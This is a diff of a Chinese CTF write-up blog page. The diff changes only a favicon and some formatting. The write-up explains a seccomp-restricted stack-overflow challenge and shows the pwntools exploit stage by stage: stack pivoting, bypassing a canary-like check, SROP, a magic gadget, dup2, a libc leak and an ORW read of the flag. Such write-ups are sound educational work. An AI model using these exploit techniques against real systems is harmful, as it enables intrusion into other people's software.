@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
-  <link rel="icon" href="/img/666.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/roxy.jpg">
+  <link rel="icon" href="/img/roxy.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -316,17 +316,14 @@
 <p>来看看题目吧</p>
 <p>首先是main函数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">return</span> vuln();<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>然后是<code>init</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 savedregs; <span class="hljs-comment">// [rsp+0h] [rbp+0h] BYREF</span><br>  _UNKNOWN *retaddr; <span class="hljs-comment">// [rsp+8h] [rbp+8h]</span><br><br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  RBP = (__int64)&amp;savedregs;<br>  RET = (__int64)retaddr - <span class="hljs-number">32</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RBP:%p\n&quot;</span>, &amp;savedregs);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RET:%p\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)RET);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Keep it and...I love you&quot;</span>);<br>  mprotect((<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> __int64)&amp;RBP &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000L</span>L), <span class="hljs-number">0x1000u</span>LL, <span class="hljs-number">1</span>);<br>  seccomp();<br>  <span class="hljs-keyword">return</span> close(<span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>设置了标准I&#x2F;O(0 stdin 1 stdout 2 stderr)</p>
+<p>设置了标准I/O(0 stdin 1 stdout 2 stderr)</p>
 <p>随后直接打印了<code>RBP</code>的值与返回地址</p>
 <p>使用<code>mprotect</code>将包含全局变量<code>RBP</code>的内存页(按页对齐，大小<code>0x1000</code>字节)设置为<strong>只读</strong></p>
 <p>并<code>close(2)</code>关闭错误输出(stderr)</p>
 <p>以及<code>seccomp</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">seccomp</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v1 = seccomp_init(<span class="hljs-number">2147418112LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">59LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">322LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">303LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">304LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">40LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">44LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">46LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">19LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">17LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">295LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">327LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">9LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">18LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">20LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">296LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">328LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">5LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">10LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">41LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">42LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">49LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">50LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">56LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">57LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">1LL</span>);<br>  <span class="hljs-keyword">return</span> seccomp_load(v1);<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p><img src="/images/98.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>ban了<code>execve</code>，<code>execveat</code>等等一堆东西</p>
 <p>明显只能<code>ORW</code></p>
@@ -335,21 +332,18 @@
 <p>所以需要<code>dup2(1, 2)</code>更改fd才能再调用write</p>
 <p>继续看vuln函数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> rread();<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>套娃是吧，后面你就懂了</p>
 <p>接下来是<code>rread</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">rread</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br><br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x88u</span>LL);<br>  <span class="hljs-keyword">return</span> shadow((__int64)buf);<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>终于看到漏洞点了</p>
 <p>buf的长度为96字节，而<code>read</code>读取<code>0x88</code>字节</p>
 <p>显然存在<strong>栈溢出</strong></p>
 <p>不过要注意一下为什么return了一个<code>shadow</code>函数?</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">shadow</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(<span class="hljs-number">24LL</span> * i + a1), LOVE, <span class="hljs-number">0x18u</span>LL) )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You don&#x27;t love me?&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(a1 + <span class="hljs-number">96</span>), &amp;RBP, <span class="hljs-number">8uLL</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You don&#x27;t keep it?&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(a1 + <span class="hljs-number">104</span>), &amp;RET, <span class="hljs-number">8uLL</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You don&#x27;t keep it?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>原来这是一个检测</p>
 <p>要求buf必须为四个<code>I love you I feel lonely</code>(全局变量<code>LOVE</code>)</p>
 <p>且RBP的值与返回地址不能被修改</p>
-<p>乍一看似乎就算没通过检测只是打印<code>You don&#39;t love me?</code>和<code>You don&#39;t keep it?</code></p>
+<p>乍一看似乎就算没通过检测只是打印<code>You don't love me?</code>和<code>You don't keep it?</code></p>
 <p>仔细一想</p>
 <p>puts底层会调用write，而write的fd1被沙箱禁用，便会直接退出程序</p>
 <p>也就是说前<code>0x70</code>字节确实不能动</p>
@@ -359,7 +353,6 @@
 <div class="note note-info">
             <p>注意本地调试最好先暂时关闭<code>ASLR</code></p> 
           </div>
-
 <p><img src="/images/99.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>发现了什么</p>
 <p>我们可控的最后8字节刚好可以覆盖上一个函数的<code>saved rbp</code></p>
@@ -369,7 +362,6 @@
 <p>这次先接收白给的信息以通过检测</p>
 <p>并列出也许有用的<code>gadget</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&#x27;RBP:&#x27;</span>)<br>RBP = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;RET:&#x27;</span>)<br>RET = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)<br><br>log.success(<span class="hljs-string">f&quot;RBP = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(RBP)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;RET = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(RET)&#125;</span>&quot;</span>)<br><br>pie_base = RET - <span class="hljs-number">0x1871</span><br>magic_gadget = pie_base + <span class="hljs-number">0x1252</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x0000000000001252 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>read1 = pie_base + <span class="hljs-number">0x182f</span><br>read2 = pie_base + <span class="hljs-number">0x1840</span><br>read3 = pie_base + <span class="hljs-number">0x183b</span><br>leave_ret = pie_base + <span class="hljs-number">0x1852</span><br>pop_rbp_ret = magic_gadget + <span class="hljs-number">1</span><br>ret = pop_rbp_ret + <span class="hljs-number">1</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:000000000000182F                 lea     rax, [rbp+buf]</span><br><span class="hljs-string">.text:0000000000001833                 mov     edx, 88h        ; nbytes</span><br><span class="hljs-string">.text:0000000000001838                 mov     rsi, rax        ; buf</span><br><span class="hljs-string">.text:000000000000183B                 mov     edi, 0          ; fd</span><br><span class="hljs-string">.text:0000000000001840                 call    _read</span><br><span class="hljs-string">.text:0000000000001845                 lea     rax, [rbp+buf]</span><br><span class="hljs-string">.text:0000000000001849                 mov     rdi, rax</span><br><span class="hljs-string">.text:000000000000184C                 call    shadow</span><br><span class="hljs-string">.text:0000000000001851                 nop</span><br><span class="hljs-string">.text:0000000000001852                 leave</span><br><span class="hljs-string">.text:0000000000001853                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>LOVE = <span class="hljs-string">b&quot;I love you I feel lonely&quot;</span><br><br>payload1 = LOVE * <span class="hljs-number">4</span><br>payload1 += p64(RBP)<br>payload1 += p64(RET)<br><br>payload1 += p64(RBP + <span class="hljs-number">0x10</span>) + p64(read1) + p64(RBP - <span class="hljs-number">0x10</span>)<br></code></pre></td></tr></table></figure>
-
 <p>stack</p>
 <p><img src="/images/100.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>ni</p>
@@ -385,7 +377,6 @@
 <div class="note note-primary">
             <p>栈迁移(stack pivot)基础，不再赘述</p> 
           </div>
-
 <p>因此我们布置上面的payload，从而控制执行流再次<code>read</code>，创造利用空间</p>
 <p>然而</p>
 <p>shadow的检测无疑是一道坎</p>
@@ -396,7 +387,6 @@
 <p><strong>栈返回</strong></p>
 <p>程序被我们控制后的执行流是这样的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000000182F                 lea     rax, [rbp+buf]<br>.text:0000000000001833                 mov     edx, 88h        ; nbytes<br>.text:0000000000001838                 mov     rsi, rax        ; buf<br>.text:000000000000183B                 mov     edi, 0          ; fd<br>.text:0000000000001840                 call    _read<br>.text:0000000000001845                 lea     rax, [rbp+buf]<br>.text:0000000000001849                 mov     rdi, rax<br>.text:000000000000184C                 call    shadow<br>.text:0000000000001851                 nop<br>.text:0000000000001852                 leave<br>.text:0000000000001853                 retn<br></code></pre></td></tr></table></figure>
-
 <p>看似无法绕过shadow检测</p>
 <p>实则不然</p>
 <p>我们调试看看</p>
@@ -406,7 +396,6 @@
 <p><img src="/images/103.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>发现了什么</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000001845                 lea     rax, [rbp+buf]<br></code></pre></td></tr></table></figure>
-
 <p><code>call read</code>的返回地址直接被保存在栈上</p>
 <p>补充一下</p>
 <p>read其实是glibc共享库中封装好的函数以方便用户的直接调用</p>
@@ -415,7 +404,6 @@
 <p>当执行<code>SYS_read</code>时才真正触发<strong>系统调用</strong>阻塞并等待中断触发时唤醒读入</p>
 <p>更底层看，便是汇编</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax, 0<br>mov rdi, fd<br>mov rsi, buf<br>mov rdx, size<br>syscall<br></code></pre></td></tr></table></figure>
-
 <p>更更底层呢</p>
 <p>那便是硬件在干活了</p>
 <p>我们直接忽略吧</p>
@@ -429,7 +417,6 @@
 <p>计算读入起始地址与偏移</p>
 <p>布置payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(RBP + <span class="hljs-number">0xf0</span>) + p64(read1) + p64(leave_ret)<br>payload2 += p64(RBP + <span class="hljs-number">0x100</span>) + p64(leave_ret) + p64(RBP - <span class="hljs-number">0x18</span>) + p64(leave_ret) + p64(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0xec</span>)<br></code></pre></td></tr></table></figure>
-
 <p>但是存在一个问题</p>
 <p>这个<code>syscall</code>提供的<code>SROP</code>没有那么干净，也没有那么强有力</p>
 <p>我们最想要的其实是<code>syscall ret</code></p>
@@ -437,7 +424,6 @@
 <p><strong>magic-gadget</strong></p>
 <p>长这样:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x0000000000001252 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret<br></code></pre></td></tr></table></figure>
-
 <p>看似平平无奇</p>
 <p>实则却能发挥出巨大的威力</p>
 <p>我们通过<code>SROP</code>设置好精确计算偏移的<code>rbx</code>和<code>rbp</code></p>
@@ -457,7 +443,6 @@
 <p>正常过检测</p>
 <p>配合<code>payload2</code>提前布置好的栈风水</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload3 = LOVE * <span class="hljs-number">4</span><br>payload3 += p64(RBP) + p64(RET)<br>payload3 += p64(RBP + <span class="hljs-number">0xf0</span>) + p64(read1)<br></code></pre></td></tr></table></figure>
-
 <p>得到一个干净的<code>read</code>环境</p>
 <p><img src="/images/110.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>接下来便可以着手准备<code>SROP</code>了</p>
@@ -470,7 +455,6 @@
 <p>构造<code>payload4</code></p>
 <p>布置<code>sigcontext</code>的同时打<code>栈返回</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">payload4 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rdi</span><br>payload4 += p64(RBP + <span class="hljs-number">0x30</span>) <span class="hljs-comment"># rsi</span><br>payload4 += p64(RBP + <span class="hljs-number">0x65</span>) <span class="hljs-comment"># rbp</span><br>payload4 += p64(<span class="hljs-number">0x6edca</span>) <span class="hljs-comment"># rbx</span><br>payload4 += p64(<span class="hljs-number">0x200</span>) <span class="hljs-comment"># rdx</span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rax </span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload4 += p64(RBP + <span class="hljs-number">0x40</span>) <span class="hljs-comment"># rsp</span><br>payload4 += p64(read2) <span class="hljs-comment"># rip</span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload4 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br>payload4 += p64(RBP + <span class="hljs-number">0x150</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>) + p64(leave_ret)<br></code></pre></td></tr></table></figure>
-
 <p>发送后的栈布局:</p>
 <p><img src="/images/115.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>执行<code>leave ret</code>后再次read:</p>
@@ -482,7 +466,6 @@
 <p><img src="/images/117.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>布置<code>payload5</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload5 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
-
 <p>发送</p>
 <p>此时栈布局:</p>
 <p><img src="/images/118.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
@@ -495,25 +478,20 @@
 <p>依旧布置<code>sigcontext</code>的同时打<strong>栈返回</strong></p>
 <p>原理一致，我就不贴图了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">payload6 = p64(leave_ret)<br>payload6 += p64(magic_gadget)<br>payload6 += p64(pop_rbp_ret)<br>payload6 += p64(RBP + <span class="hljs-number">0xa8</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>)<br>payload6 += p64(leave_ret) + p64(RBP + <span class="hljs-number">0xd0</span>) + p64(read1) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>payload6 += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># rdi</span><br>payload6 += p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rsi</span><br>payload6 += p64(RBP + <span class="hljs-number">0x68</span>) <span class="hljs-comment"># rbp</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rbx</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rdx</span><br>payload6 += p64(<span class="hljs-number">33</span>) <span class="hljs-comment"># rax </span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload6 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsp</span><br>payload6 += p64(ret) <span class="hljs-comment"># rip</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload6 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br></code></pre></td></tr></table></figure>
-
 <p>由于<code>rbp</code>和<code>rbx</code>已经被我们所控制</p>
 <p>此时执行<code>magic-gadget</code>后</p>
 <p>成功获得<code>syscall ret</code></p>
 <p><img src="/images/121.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>随后依旧<code>SROP</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload7 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
-
 <p>配合<code>payload6</code>的<code>sigcontext</code>成功<code>dup2(1, 2)</code></p>
 <p>现在获得标准输出(<code>stdout</code>)了便能轻松泄露libc基址了</p>
 <p>同理</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">payload8 = p64(pop_rbp_ret) + p64(RBP + <span class="hljs-number">0xd8</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>) + p64(leave_ret)<br>payload8 += p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rdi</span><br>payload8 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsi</span><br>payload8 += p64(RBP + <span class="hljs-number">0xe8</span>) <span class="hljs-comment"># rbp</span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rbx</span><br>payload8 += p64(<span class="hljs-number">0x200</span>) <span class="hljs-comment"># rdx</span><br>payload8 += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># rax </span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload8 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsp</span><br>payload8 += p64(ret) <span class="hljs-comment"># rip</span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload8 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br>payload8 += p64(read3)<br><br>payload9 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
-
 <p>接收</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">syscall = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc_base = syscall - <span class="hljs-number">0x98fb6</span><br>success(<span class="hljs-string">&#x27;libc_base =&gt;&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>pop_rax_ret = libc_base + <span class="hljs-number">0xdd237</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x10f75b</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x110a4d</span><br></code></pre></td></tr></table></figure>
-
 <p>最后打<code>ORW</code>获得flag</p>
